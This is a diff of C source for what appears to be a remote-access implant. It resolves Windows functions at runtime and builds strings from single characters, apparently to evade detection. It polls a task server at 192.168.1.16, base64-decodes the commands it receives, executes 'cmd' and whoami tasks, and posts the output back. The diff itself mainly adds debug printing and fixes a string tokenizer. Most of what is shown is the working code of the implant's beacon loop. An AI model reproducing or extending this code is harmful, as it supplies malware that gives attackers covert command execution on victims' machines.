@@ -731,19 +731,19 @@ CHAR* myStrtok(CHAR* str, CHAR delim, BOOL reset)
     static DWORD index = 0;
     if (reset)
     { index=0; return NULL; }
-    CHAR* token = { 0 };
+    //CHAR* token = { 0 };
     DWORD lenStr = myStrlenA(str);
     str += index;
 
-    for (int i=0; i<lenStr; i++)
+    for (int i=0; i<lenStr+1; i++)
     {
         if (str[i] == delim)
         { str[i] = '\0'; }
     }
 
-    token = str;
-    index += myStrlenA(token)+1;    // +1 for null byte
-    return token;
+    //token = str;
+    index += myStrlenA(str)+1;    // +1 for null byte
+    return str;
 }
 
 CHAR* myStartTrim(CHAR* str, CHAR trim)
@@ -782,14 +782,19 @@ CHAR* myTrimB(PAPI api, CHAR* str, CHAR trim)
 
 CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** uuid)
 {
+    ((PRINTF)api->printf)("\nYou're in readJsonTask\n", uuid);
     CHAR* tmpJson = json;  // myStrtok modifies the string itself
     CHAR* task;
     CHAR delim = { '\n' };
+    ((PRINTF)api->printf)("\ntmpJson: %s\n", tmpJson);
     CHAR* token = myStrtok(tmpJson, delim, FALSE);
+    ((PRINTF)api->printf)("\nFirst token: %s\n", token);
     CHAR blacklist[] = { '[', ']', '\0' };
 
-    if (tmpJson[0] == '[' && tmpJson[1] == ']')
+    if (token[0] == '[' && token[1] == ']')
     {
+        ((PRINTF)api->printf)("tmpJson is empty, returning NULL");
+        myStrtok(NULL, 0, TRUE);
         return NULL;
     }
 
@@ -809,16 +814,27 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
 
     // dont look
     *taskId = myTrim(token, ' ');
+    ((PRINTF)api->printf)("\ntaskId: %s\n", *taskId);
     *taskId = myEndTrim(*taskId, ',');
+    ((PRINTF)api->printf)("\ntaskId: %s\n", *taskId);
     task = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
+    ((PRINTF)api->printf)("\ntask: %s\n", task);
     task = myEndTrim(task, ',');
+    ((PRINTF)api->printf)("\ntask: %s\n", task);
     task = myTrim(task, '"');
+    ((PRINTF)api->printf)("\ntask: %s\n", task);
     *taskType = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
+    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
     *taskType= myEndTrim(*taskType, ',');
+    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
     *taskType = myTrim(*taskType, '"');
+    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
     *uuid = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
+    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);
     *uuid = myEndTrim(*uuid, ',');
+    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);
     *uuid = myTrim(*uuid, '"');
+    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);
 
     myStrtok(NULL, 0, TRUE);
     return task;
@@ -944,9 +960,9 @@ void myMain()
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
 
     PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll, runCmd_c);
-    ((PRINTF)api->printf)("\n%p\n",PEsgStdApi->Whoami);
+    ((PRINTF)api->printf)("\np RunCmd: %p\n",PEsgStdApi->RunCmd);
     PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll, whoami_c);
-    ((PRINTF)api->printf)("\n%p\n",PEsgStdApi->Whoami);
+    ((PRINTF)api->printf)("\np Whoami: %p\n",PEsgStdApi->Whoami);
 
     WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
     WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
@@ -981,17 +997,23 @@ void myMain()
 
         if (jsonResponse == NULL)
         {
+            ((PRINTF)api->printf)("\njsonResponse is NULL, sleeping...\n");
             ((SLEEP)api->Sleep)(3000);
             continue;
         }
+        ((PRINTF)api->printf)("\np jsonResponse: %p", jsonResponse);
+        ((PRINTF)api->printf)("\njsonResponse: %s", jsonResponse);
 
         b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);
 
         if (b64Task == NULL)
         {
+            ((PRINTF)api->printf)("\nb64Task is NULL, sleeping...\n");
             ((SLEEP)api->Sleep)(3000);
             continue;
         }
+        ((PRINTF)api->printf)("\np b64Task: %p\n", b64Task);
+        ((PRINTF)api->printf)("\nb64Task: %s\n", b64Task);
 
         ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
         (
@@ -1015,6 +1037,8 @@ void myMain()
                 NULL,
                 NULL
         );
+        ((PRINTF)api->printf)("\np task: %p", task);
+        ((PRINTF)api->printf)("\ntask: %s", task);
 
         if (my_strcmp(taskType, "cmd") == 0)
         {
@@ -1025,7 +1049,7 @@ void myMain()
             ((PRINTF)api->printf)("\nho\n");
             taskOutput = myTrimB(api, ((WHOAMI)PEsgStdApi->Whoami)(), '\n');
             ((PRINTF)api->printf)("\nyo\n");
-            ((PRINTF)api->printf)("\n%s\n", taskOutput);
+            ((PRINTF)api->printf)("\ntaskOutput: \n%s\n", taskOutput);
         }
         else
         {
@@ -1048,9 +1072,9 @@ void myMain()
             '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f',
             'a', '2', 'f', '0', 'd', '0', 0
         };
-        ((PRINTF)api->printf)("%d\n", totalJsonSize);
-        ((PRINTF)api->printf)("%d\n", myStrlenA(json));
-        ((PRINTF)api->printf)("%s\n", json);
+        ((PRINTF)api->printf)("\ntotalJsonSize: %d\n", totalJsonSize);
+        ((PRINTF)api->printf)("\nmyStrlenA(json): %d\n", myStrlenA(json));
+        ((PRINTF)api->printf)("\njson: %s\n", json);
         PostRequest(api, wServer, port, fullPath2, json);
 
         if (taskOutput)
